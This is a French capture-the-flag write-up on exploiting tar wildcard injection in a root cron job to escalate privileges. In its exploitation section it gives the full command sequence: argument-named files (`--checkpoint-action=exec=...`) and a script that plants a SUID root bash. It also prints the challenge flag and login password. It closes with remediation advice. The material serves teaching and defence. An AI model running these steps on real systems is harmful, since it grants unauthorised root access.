# Writeup — Cron Wildcard Injection

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Medium  
**Points** : 250  
**Flag** : `CTF{tar_wildcard_cron_injection}`

## Contexte

Les tâches cron root qui utilisent des wildcards (`*`) dans des répertoires accessibles en écriture peuvent être exploitées. L'outil `tar` accepte des options via des noms de fichiers spéciaux (ex: `--checkpoint=1`, `--checkpoint-action=exec=cmd`). Lorsque tar développe le wildcard `*` dans un répertoire contrôlé par un attaquant, ces "faux fichiers" sont interprétés comme des arguments de ligne de commande, permettant l'exécution de code arbitraire.

## Connexion

```bash
ssh player@<TARGET_IP> -p 5022
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

On commence par chercher des tâches cron potentiellement exploitables :

```bash
player@container:~$ cat /etc/crontab
player@container:~$ ls -la /etc/cron.d/
```

Sortie attendue pour `/etc/cron.d/` :

```
total 12
drwxr-xr-x 1 root root 4096 Jan  1 00:00 .
drwxr-xr-x 1 root root 4096 Jan  1 00:00 ..
-rw-r--r-- 1 root root   73 Jan  1 00:00 backup
```

Lecture du fichier cron :

```bash
player@container:~$ cat /etc/cron.d/backup
* * * * * root cd /tmp/uploads && tar czf /tmp/backup.tgz * 2>/dev/null
```

Points clés :
- Le job tourne toutes les minutes en tant que **root**
- Il exécute `tar czf /tmp/backup.tgz *` dans `/tmp/uploads`
- Le `*` est un wildcard shell

### 2. Identification de la vulnérabilité

On vérifie les permissions de `/tmp/uploads` :

```bash
player@container:~$ ls -la /tmp/
drwxrwxrwt 1 root root  40 Jan  1 00:00 uploads
```

Le répertoire `/tmp/uploads` est world-writable (`rwxrwxrwt`). Cela signifie que l'utilisateur `player` peut y créer des fichiers avec n'importe quel nom.

**La vulnérabilité** : Lorsque `tar` traite le wildcard `*`, le shell l'étend en listant les fichiers du répertoire. Si des fichiers sont nommés `--checkpoint=1` ou `--checkpoint-action=exec=cmd`, ils sont passés à tar comme des arguments, non comme des noms de fichiers. Tar les interprète alors comme des options de ligne de commande.

Documentation de l'option tar :
- `--checkpoint=N` : affiche un message tous les N blocs traités
- `--checkpoint-action=ACTION` : exécute ACTION à chaque checkpoint (ex: `exec=script.sh`)

### 3. Exploitation

**Étape 3a** : Se placer dans le répertoire vulnérable et créer le payload

```bash
player@container:~$ cd /tmp/uploads

player@container:/tmp/uploads$ cat > privesc.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF

player@container:/tmp/uploads$ chmod +x privesc.sh
```

**Étape 3b** : Créer les fichiers "arguments" pour tar

```bash
player@container:/tmp/uploads$ touch -- '--checkpoint=1'
player@container:/tmp/uploads$ touch -- '--checkpoint-action=exec=bash privesc.sh'
```

Note : le `--` force `touch` à traiter ce qui suit comme un nom de fichier, même si ça ressemble à une option.

Vérification des fichiers créés :

```bash
player@container:/tmp/uploads$ ls -la
total 16
drwxrwxrwt 2 root   root   4096 Jan  1 00:01 .
drwxrwxrwt 1 root   root   4096 Jan  1 00:00 ..
-rw-r--r-- 1 player player    0 Jan  1 00:01 --checkpoint=1
-rw-r--r-- 1 player player    0 Jan  1 00:01 --checkpoint-action=exec=bash privesc.sh
-rwxr-xr-x 1 player player   56 Jan  1 00:01 privesc.sh
```

**Étape 3c** : Attendre que le cron s'exécute (max 1 minute)

```bash
player@container:/tmp/uploads$ watch -n 5 ls -la /tmp/rootbash
```

Après l'exécution du cron, `/tmp/rootbash` apparaîtra avec le bit SUID :

```
-rwsr-sr-x 1 root root 1234376 Jan  1 00:02 /tmp/rootbash
```

### 4. Récupération du flag

```bash
player@container:/tmp/uploads$ /tmp/rootbash -p
rootbash-5.1# whoami
root
rootbash-5.1# cat /root/flag.txt
CTF{tar_wildcard_cron_injection}
```

Note : l'option `-p` est nécessaire pour que bash conserve l'EUID root hérité du SUID bit.

## Explication de la vulnérabilité

Cette vulnérabilité repose sur la combinaison de deux facteurs :

1. **L'expansion de wildcard** par le shell : `tar czf backup.tgz *` dans `/tmp/uploads` devient `tar czf backup.tgz --checkpoint=1 '--checkpoint-action=exec=bash privesc.sh' privesc.sh`
2. **Les options de checkpoint de tar** : `--checkpoint-action=exec=` permet d'exécuter une commande arbitraire lors de l'archivage

L'attaque est connue depuis longtemps (popularisée par la présentation "Back To The Future: Unix Wildcards Gone Wild" de Leon Juranic en 2014).

**Impact réel** : Exécution de code arbitraire en tant que root sur le serveur. Permettrait à un attaquant d'établir une backdoor persistante, d'exfiltrer des données, ou de compromettre l'ensemble du système.

## Recommandations de remédiation

1. **Éviter les wildcards dans les scripts cron root** sur des répertoires world-writable.
2. **Utiliser des chemins absolus** et spécifier explicitement les fichiers à archiver.
3. **Restreindre les permissions des répertoires de travail** des scripts privilégiés.
4. **Remplacer la commande vulnérable** par :
   ```bash
   find /tmp/uploads -maxdepth 1 -type f -print0 | tar czf /tmp/backup.tgz --null -T -
   ```
5. **Monitorer la création de fichiers** dans les répertoires sensibles avec inotifywait ou auditd.

## Références

- "Back To The Future: Unix Wildcards Gone Wild" (Leon Juranic) : https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
- GTFOBins - tar : https://gtfobins.github.io/gtfobins/tar/
- MITRE ATT&CK T1053.003 (Cron) : https://attack.mitre.org/techniques/T1053/003/
- tar(1) man page : `--checkpoint` et `--checkpoint-action`
